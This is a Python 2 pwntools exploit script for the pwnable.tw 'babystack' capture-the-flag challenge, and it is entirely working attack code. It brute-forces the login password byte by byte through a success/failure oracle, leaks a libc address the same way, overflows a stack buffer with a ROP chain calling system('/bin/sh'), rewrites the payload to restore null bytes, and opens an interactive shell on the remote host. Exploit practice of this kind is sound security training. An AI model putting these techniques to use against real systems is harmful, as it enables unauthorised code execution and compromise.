#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

ready =  True
if ready:
    conn = remote('chall.pwnable.tw', 10205)
else:
    conn = process(['/home/doublesine/Desktop/babystack'])



def findOccurrences(s, ch):
    return [i for i, letter in enumerate(s) if letter == ch]

def Replace(s, upper_bound, old, new):
    return s[0:upper_bound].replace(old, new) + s[upper_bound:]

def Sendraw(s):
    conn.send_raw(s)
    print(s)

def Login(s):
    print conn.read(),
    Sendraw('1')
    print conn.read(),
    Sendraw(s + '\x00')
    recv = conn.readline()
    print recv,
    if recv.find('Success') != -1:
        return True
    else:
        return False

def Logout():
    print conn.read(),
    Sendraw('1')

# leak password
Password = ''
while len(Password) < 0x10:
    bFound = False
    for i in range(1, 256):
        if Login(Password + chr(i)) == True:
            Logout()
            Password += chr(i)
            bFound = True
            break
    assert(bFound == True)
print '[*] Password = %s' % Password

print conn.read(),
Sendraw('1')
print conn.read(),
Sendraw(Password + '\x00' * 16 + 'A' * 40)
print conn.read(),
Sendraw('3')
print conn.read(),
Sendraw('A' * 63)
Logout()

# leak libc address
libc_offset_0x78439_addr = 'AAAAAAAA'
while len(libc_offset_0x78439_addr) < 0x10:
    bFound = False
    for i in range(1, 256)[::-1]:
        if Login(libc_offset_0x78439_addr + chr(i)) == True:
            Logout()
            libc_offset_0x78439_addr += chr(i)
            bFound = True
            break
    if bFound == False:
        break
libc_offset_0x78439_addr = libc_offset_0x78439_addr[8:]
libc_offset_0x78439_addr += (8 - len(libc_offset_0x78439_addr)) * '\x00'
libc_offset_0x78439_addr = unpack(libc_offset_0x78439_addr, 64)
libc_base_addr = libc_offset_0x78439_addr - 0x78439
print '[*] Password = %s' % Password
print '[*] libc_base_addr = 0x%016x' % libc_base_addr

# build ROP chain
libc_system = libc_base_addr + 0x0000000000045390
libc_bin_sh_addr = libc_base_addr + 0x000000000018C177
# 0x0000000000021102 : pop rdi ; ret
payload = pack(libc_base_addr + 0x0000000000021102, 64) + pack(libc_bin_sh_addr, 64) + pack(libc_system, 64)

# send ROP chain
print conn.read(),
Sendraw('1')
print conn.read(),
Sendraw(('\x00' + 'A' * 63 + Password + 'A' * 16 + 'fuckfuck' + payload.replace('\x00', 'A'))[:127])
print conn.read(),
Sendraw('3')
print conn.read(),
Sendraw('A' * 63)
Logout()

for i in findOccurrences(payload, '\x00')[::-1]:
    print conn.read(),
    Sendraw('1')
    print conn.read(),
    Sendraw(('\x00' + 'A' * 63 + Password + 'A' * 16 + 'fuckfuck' + Replace(payload, i, '\x00', 'A'))[:127])
    print conn.read(),
    Sendraw('3')
    print conn.read(),
    Sendraw('A' * 63)
    Logout()

# exit to trigger ROP chain
Login(Password)
print conn.read(),
Sendraw('2')
conn.interactive()
